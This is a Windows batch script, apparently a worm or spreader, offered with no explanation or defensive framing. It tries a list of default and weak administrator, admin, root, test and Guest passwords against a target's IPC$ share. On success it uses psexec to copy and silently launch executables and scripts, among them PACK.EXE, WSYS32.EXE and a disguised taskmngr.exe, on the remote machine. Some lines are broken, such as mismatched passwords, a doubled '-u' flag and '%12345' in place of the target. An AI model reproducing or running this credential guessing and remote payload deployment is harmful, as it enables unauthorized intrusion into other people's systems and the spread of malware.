@echo off
:begin
net use /del \\%1\ipc$
net use \\%1\ipc$ /user:administrator ""
net use \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto blkad
net use \\%1\ipc$ /user:administrator "administrator"
net use \\%1\ipc$ "administrator" /user:administrator
if not errorlevel 1 goto adad
net use \\%1\ipc$ /user:administrator "test"
net use \\%1\ipc$ "test" /user:administrator
if not errorlevel 1 goto adtest
net use \\%1\ipc$ /user:test "test"
net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt
net use \\%1\ipc$ /user:administrator "test123"
net use \\%1\ipc$ "test123" /user:administrator
if not errorlevel 1 goto adtestt
net use \\%1\ipc$ /user:administrator "temp"
net use \\%1\ipc$ "temp" /user:administrator
if not errorlevel 1 goto adtemp
net use \\%1\ipc$ /user:administrator "temp123"
net use \\%1\ipc$ "temp123" /user:administrator
if not errorlevel 1 goto adtempp
net use \\%1\ipc$ /user:administrator "pass"
net use \\%1\ipc$ "pass" /user:administrator
if not errorlevel 1 goto adpass
net use \\%1\ipc$ /user:administrator "password"
net use \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto adpassw
net use \\%1\ipc$ /user:administrator "admin"
net use \\%1\ipc$ "admin" /user:administrator
if not errorlevel 1 goto adadmin
net use \\%1\ipc$ /user:root "root"
net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto rootroot
net use \\%1\ipc$ /user:administrator "changeme"
net use \\%1\ipc$ "changeme" /user:administrator
if not errorlevel 1 goto adminch
net use \\%1\ipc$ /user:Administrator "a"
net use \\%1\ipc$ "a" /user:Administrator
if not errorlevel 1 goto admia
net use \\%1\ipc$ /user:Administrator "zxcvbnm"
net use \\%1\ipc$ "zxcvbnm" /user:Administrator
if not errorlevel 1 goto admiz
net use \\%1\ipc$ /user:Administrator "qwerty"
net use \\%1\ipc$ "qwerty" /user:Administrator
if not errorlevel 1 goto admiq
net use \\%1\ipc$ /user:Administrator "1234"
net use \\%1\ipc$ "1234" /user:Administrator
if not errorlevel 1 goto admi1234
net use \\%1\ipc$ /user:Administrator "root"
net use \\%1\ipc$ "root" /user:Administrator
if not errorlevel 1 goto admiroot
net use \\%1\ipc$ /user:Administrator "asdf"
net use \\%1\ipc$ "asdf" /user:Administrator
if not errorlevel 1 goto admiasdf
net use \\%1\ipc$ /user:Administrator "123"
net use \\%1\ipc$ "123" /user:Administrator
if not errorlevel 1 goto admi123
net use \\%1\ipc$ /user:Administrator "server"
net use \\%1\ipc$ "server" /user:Administrator
if not errorlevel 1 goto admiserver
net use \\%1\ipc$ /user:Administrator "1"
net use \\%1\ipc$ "1" /user:Administrator
if not errorlevel 1 goto admi1
net use \\%1\ipc$ /user:Administrator "12345"
net use \\%1\ipc$ "12345" /user:Administrator
if not errorlevel 1 goto admi12345
net use \\%1\ipc$ /user:Administrator "2002"
net use \\%1\ipc$ "2002" /user:Administrator
if not errorlevel 1 goto admi2002
net use \\%1\ipc$ /user:Administrator "2000"
net use \\%1\ipc$ "2000" /user:Administrator
if not errorlevel 1 goto admi2000
net use \\%1\ipc$ /user:Administrator "2001"
net use \\%1\ipc$ "2001" /user:Administrator
if not errorlevel 1 goto admi2001
net use \\%1\ipc$ /user:Administrator "12"
net use \\%1\ipc$ "12" /user:Administrator
if not errorlevel 1 goto admi12
net use \\%1\ipc$ /user:admin "admin"
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto adminad
net use \\%1\ipc$ /user:admin ""
net use \\%1\ipc$ "" /user:admin
if not errorlevel 1 goto admblank
net use \\%1\ipc$ /user:Guest ""
net use \\%1\ipc$ "" /user:Guest
if not errorlevel 1 goto guestt
goto end
:blkad
psexec \\%1 -u administrator -p "" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "" -f -c -d teer.bat
psexec \\%1 -u administrator -p "" -f -c -d teers.bat
psexec \\%1 -u administrator -p "" -f -c -d copee.bat
psexec \\%1 -u administrator -p "" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adad
psexec \\%1 -u administrator -p "admin" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "admin" -f -c -d teer.bat
psexec \\%1 -u administrator -p "admin" -f -c -d teers.bat
psexec \\%1 -u administrator -p "admin" -f -c -d copee.bat
psexec \\%1 -u administrator -p "admin" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "admin" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adadmin
psexec \\%1 -u administrator -p "administrator" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "administrator" -f -c -d teer.bat
psexec \\%1 -u administrator -p "administrator" -f -c -d teers.bat
psexec \\%1 -u administrator -p "administrator" -f -c -d copee.bat
psexec \\%1 -u administrator -p "administrator" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "administrator" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "administrator" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:rootroot
psexec \\%1 -u root -p "root" -f -c -d PACK.EXE -o
psexec \\%1 -u root -p "root" -f -c -d teer.bat
psexec \\%1 -u root -p "root" -f -c -d teers.bat
psexec \\%1 -u root -p "root" -f -c -d copee.bat
psexec \\%1 -u root -p "root" -f -c -d WSYS32.EXE -o
psexec \\%1 -u root -p "root" -d WSYS32.EXE -o
psexec \\%1 -u root -p "root" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adminad
psexec \\%1 -u admin -p "admin" -f -c -d PACK.EXE -o
psexec \\%1 -u admin -p "admin" -f -c -d teer.bat
psexec \\%1 -u admin -p "admin" -f -c -d teers.bat
psexec \\%1 -u admin -p "admin" -f -c -d copee.bat
psexec \\%1 -u admin -p "admin" -f -c -d WSYS32.EXE -o
psexec \\%1 -u admin -p "admin" -d WSYS32.EXE -o
psexec \\%1 -u admin -p "admin" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adtest
psexec \\%1 -u administrator -p "test" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "test" -f -c -d teer.bat
psexec \\%1 -u administrator -p "test" -f -c -d teers.bat
psexec \\%1 -u administrator -p "test" -f -c -d copee.bat
psexec \\%1 -u administrator -p "test" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "test" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "test" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:testt
psexec \\%1 -u test -u "test" -f -c -d PACK.EXE -o
psexec \\%1 -u test -u "test" -f -c -d teer.bat
psexec \\%1 -u test -u "test" -f -c -d teers.bat
psexec \\%1 -u test -u "test" -f -c -d copee.bat
psexec \\%1 -u test -u "test" -f -c -d WSYS32.EXE -o
psexec \\%1 -u test -u "test" -d WSYS32.EXE -o
psexec \\%1 -u test -u "test" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adtestt
psexec \\%1 -u administrator -p "test123" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "test123" -f -c -d teer.bat
psexec \\%1 -u administrator -p "test123" -f -c -d teers.bat
psexec \\%1 -u administrator -p "test123" -f -c -d copee.bat
psexec \\%1 -u administrator -p "test123" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "test123" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "test123" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adtemp
psexec \\%1 -u administrator -p "temp" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "temp" -f -c -d teer.bat
psexec \\%1 -u administrator -p "temp" -f -c -d teers.bat
psexec \\%1 -u administrator -p "temp" -f -c -d copee.bat
psexec \\%1 -u administrator -p "temp" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "temp" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "temp" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adtempp
psexec \\%1 -u administrator -p "temp123" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "temp123" -f -c -d teer.bat
psexec \\%1 -u administrator -p "temp123" -f -c -d teers.bat
psexec \\%1 -u administrator -p "temp123" -f -c -d copee.bat
psexec \\%1 -u administrator -p "temp123" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "temp123" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "temp123" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adpass
psexec \\%1 -u administrator -p "pass" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "pass" -f -c -d teer.bat
psexec \\%1 -u administrator -p "pass" -f -c -d teers.bat
psexec \\%1 -u administrator -p "pass" -f -c -d copee.bat
psexec \\%1 -u administrator -p "pass" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "pass" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "pass" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adpassw
psexec \\%1 -u administrator -p "password" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "password" -f -c -d teer.bat
psexec \\%1 -u administrator -p "password" -f -c -d teers.bat
psexec \\%1 -u administrator -p "password" -f -c -d copee.bat
psexec \\%1 -u administrator -p "password" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "password" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "password" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:adminch
psexec \\%1 -u administrator -p "changeme" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "changeme" -f -c -d teer.bat
psexec \\%1 -u administrator -p "changeme" -f -c -d teers.bat
psexec \\%1 -u administrator -p "changeme" -f -c -d copee.bat
psexec \\%1 -u administrator -p "changeme" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "changeme" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "changeme" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admia
psexec \\%1 -u administrator -p "a" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "a" -f -c -d teer.bat
psexec \\%1 -u administrator -p "a" -f -c -d teers.bat
psexec \\%1 -u administrator -p "a" -f -c -d copee.bat
psexec \\%1 -u administrator -p "a" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "a" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "a" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admiz
psexec \\%1 -u administrator -p "zxcvbnm" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "zxcvbnm" -f -c -d teer.bat
psexec \\%1 -u administrator -p "zxcvbnm" -f -c -d teers.bat
psexec \\%1 -u administrator -p "zxcvbnm" -f -c -d copee.bat
psexec \\%1 -u administrator -p "zxcvbnm" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "zxcvbnm" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "zxcvbnm" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admiq
psexec \\%1 -u administrator -p "qwerty" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "qwerty" -f -c -d teer.bat
psexec \\%1 -u administrator -p "qwerty" -f -c -d teers.bat
psexec \\%1 -u administrator -p "qwerty" -f -c -d copee.bat
psexec \\%1 -u administrator -p "qwerty" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "qwerty" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "qwerty" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admi1234
psexec \\%1 -u administrator -p "1234" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "1234" -f -c -d teer.bat
psexec \\%1 -u administrator -p "1234" -f -c -d teers.bat
psexec \\%1 -u administrator -p "1234" -f -c -d copee.bat
psexec \\%1 -u administrator -p "1234" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "1234" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "1234" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admiroot
psexec \\%1 -u administrator -p "root" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "root" -f -c -d teer.bat
psexec \\%1 -u administrator -p "root" -f -c -d teers.bat
psexec \\%1 -u administrator -p "root" -f -c -d copee.bat
psexec \\%1 -u administrator -p "root" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "root" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "root" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admiasdf
psexec \\%1 -u administrator -p "asdf" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "asdf" -f -c -d teer.bat
psexec \\%1 -u administrator -p "asdf" -f -c -d teers.bat
psexec \\%1 -u administrator -p "asdf" -f -c -d copee.bat
psexec \\%1 -u administrator -p "asdf" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "asdf" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "asdf" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admi123
psexec \\%1 -u administrator -p "123" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "123" -f -c -d teer.bat
psexec \\%1 -u administrator -p "123" -f -c -d teers.bat
psexec \\%1 -u administrator -p "123" -f -c -d copee.bat
psexec \\%1 -u administrator -p "123" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "123" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "123" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admiserver
psexec \\%1 -u administrator -p "server" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "server" -f -c -d teer.bat
psexec \\%1 -u administrator -p "server" -f -c -d teers.bat
psexec \\%1 -u administrator -p "server" -f -c -d copee.bat
psexec \\%1 -u administrator -p "server" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "server" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "server" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admi1
psexec \\%1 -u administrator -p "1" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "1" -f -c -d teer.bat
psexec \\%1 -u administrator -p "1" -f -c -d teers.bat
psexec \\%1 -u administrator -p "1" -f -c -d copee.bat
psexec \\%1 -u administrator -p "1" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "1" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "1" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admi12345
psexec \\%12345 -u administrator -p "12345" -f -c -d PACK.EXE -o
psexec \\%12345 -u administrator -p "12345" -f -c -d teer.bat
psexec \\%12345 -u administrator -p "12345" -f -c -d teers.bat
psexec \\%12345 -u administrator -p "12345" -f -c -d copee.bat
psexec \\%12345 -u administrator -p "12345" -f -c -d WSYS32.EXE -o
psexec \\%12345 -u administrator -p "12345" -d WSYS32.EXE -o
psexec \\%12345 -u administrator -p "12345" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admi2002
psexec \\%1 -u administrator -p "2002" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "2002" -f -c -d teer.bat
psexec \\%1 -u administrator -p "2002" -f -c -d teers.bat
psexec \\%1 -u administrator -p "2002" -f -c -d copee.bat
psexec \\%1 -u administrator -p "2002" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "2002" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "2002" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admi2000
psexec \\%1 -u administrator -p "2000" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "2000" -f -c -d teer.bat
psexec \\%1 -u administrator -p "2000" -f -c -d teers.bat
psexec \\%1 -u administrator -p "2000" -f -c -d copee.bat
psexec \\%1 -u administrator -p "2000" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "2000" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "2000" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admi2001
psexec \\%1 -u administrator -p "2001" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "2001" -f -c -d teer.bat
psexec \\%1 -u administrator -p "2001" -f -c -d teers.bat
psexec \\%1 -u administrator -p "2001" -f -c -d copee.bat
psexec \\%1 -u administrator -p "2001" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "2001" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "2001" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admi12
psexec \\%1 -u administrator -p "12" -f -c -d PACK.EXE -o
psexec \\%1 -u administrator -p "12" -f -c -d teer.bat
psexec \\%1 -u administrator -p "12" -f -c -d teers.bat
psexec \\%1 -u administrator -p "12" -f -c -d copee.bat
psexec \\%1 -u administrator -p "12" -f -c -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "12" -d WSYS32.EXE -o
psexec \\%1 -u administrator -p "12" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:admblank
psexec \\%1 -u admin -p "" -f -c -d PACK.EXE -o
psexec \\%1 -u admin -p "" -f -c -d teer.bat
psexec \\%1 -u admin -p "" -f -c -d teers.bat
psexec \\%1 -u admin -p "" -f -c -d copee.bat
psexec \\%1 -u admin -p "" -f -c -d WSYS32.EXE -o
psexec \\%1 -u admin -p "" -d WSYS32.EXE -o
psexec \\%1 -u admin -p "" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:end
:guestt
psexec \\%1 -u Guest -p "" -f -c -d PACK.EXE -o
psexec \\%1 -u Guest -p "" -f -c -d teer.bat
psexec \\%1 -u Guest -p "" -f -c -d teers.bat
psexec \\%1 -u Guest -p "" -f -c -d copee.bat
psexec \\%1 -u Guest -p "" -f -c -d WSYS32.EXE -o
psexec \\%1 -u Guest -p "" -d WSYS32.EXE -o
psexec \\%1 -u Guest -p "" -d taskmngr.exe
net use * /del /y >> %systemroot\system32\spool\spool.txt
goto end
:end